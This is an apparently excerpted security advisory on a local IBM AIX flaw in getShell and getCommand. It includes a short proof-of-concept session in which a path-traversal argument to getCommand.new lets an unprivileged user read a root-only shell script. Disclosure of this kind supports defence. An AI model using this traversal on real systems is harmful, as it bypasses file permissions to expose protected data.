source: https://www.securityfocus.com/bid/16103/info

IBM AIX is prone to a local vulnerability in getShell and getCommand. This vulnerability may let the attacker gain unauthorized read access to shell scripts on the computer. 

-bash-3.00$ ls -l /tmp/k.sh -rwx------ 1 root system 79 2005-12-22 23:40
/tmp/k.sh
-bash-3.00$./getCommand.new ../../../../../tmp/k.sh

ps -ef > /tmp/log. $$
grep test /tmp/log.
$$ rm /tmp/log. $$